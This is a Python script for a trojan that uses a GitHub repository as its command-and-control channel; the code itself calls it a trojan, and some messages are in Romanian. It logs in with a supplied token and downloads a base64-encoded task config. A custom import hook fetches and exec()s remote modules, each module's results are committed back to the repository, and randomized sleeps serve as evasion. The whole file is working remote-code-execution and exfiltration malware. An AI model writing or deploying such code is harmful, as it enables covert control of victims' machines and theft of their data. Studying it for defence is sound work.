import json
import base64
import sys
import time 
import importlib.util
import random
import threading
import queue
import os
import gc

print(sys.path)
from github3 import login

trojan_id="abc"

trojan_configure="config/%s.json" % trojan_id
trojan_modules=[]
configured=False
task_queue=queue.Queue()

def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()

    try:
        file_content = repo.file_contents(filepath)
        return file_content.content
    except Exception as e:
        print(f"Error retrieving file: {e}")
        return None
    
def connect_to_github():
    gh=login(username=sys.argv[1],token=sys.argv[2])
    repo=gh.repository(sys.argv[1],sys.argv[3])
    branch=repo.branch("main")
    return gh,repo,branch
def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_configure)
    
    if config_json is None:
        print(f"[-] Eroare: Nu am putut descărca {trojan_configure}. Verifică dacă fișierul există pe GitHub.")
        return []

    try:
        decoded_config = base64.b64decode(config_json)
        config = json.loads(decoded_config)
    except Exception as e:
        print(f"[-] Eroare la decodarea JSON: {e}")
        return []

    configured = True
    return config
def store_module_result(data):
    if data is None:
        data = ""

    if isinstance(data, (dict, list)):
        data = json.dumps(data)

    if isinstance(data, str):
        data = data.encode()

    gh, repo, branch = connect_to_github()
    remote_path = f"data/{trojan_id}/{random.randint(1000,10000)}.data"

    repo.create_file(
        remote_path,
        "Commit message",
        base64.b64encode(data)
    )
class GitImporter:
    def __init__(self):
        self.source = None

    def find_spec(self, fullname, path, target=None):
        print(f"[+] Checking remote module: {fullname}")

        new_library = get_file_contents(f"modules/{fullname}.py")
        if new_library:
            self.source = base64.b64decode(new_library).decode()

            return importlib.util.spec_from_loader(fullname, self)

        return None

    def create_module(self, spec):
        return None  

    def exec_module(self, module):
        exec(self.source, module.__dict__)
def module_runner(module):
    task_queue.put(1)

    try:
        if module in sys.modules:
            del sys.modules[module]
        print("REQUESTING:", f"modules/{module}.py")
        __import__(module)

        mod = sys.modules[module]
        result = mod.run()

        store_module_result(result)

    finally:
        task_queue.get()
if __name__=="__main__":
    if(len(sys.argv) != 4):
        print("Usage: %s <github_username> <github_token> <repository_name>" % sys.argv[0])
        sys.exit(0)
    sys.meta_path= [GitImporter()]
    print("META PATH ACTIVE:", sys.meta_path)
    while True:
        if task_queue.empty():
            config=get_trojan_config()
            for task in config:
                t=threading.Thread(target=module_runner,args=(task['module'],))
                t.start()
                time.sleep(random.randint(1,10))
        time.sleep(random.randint(1000,10000))
            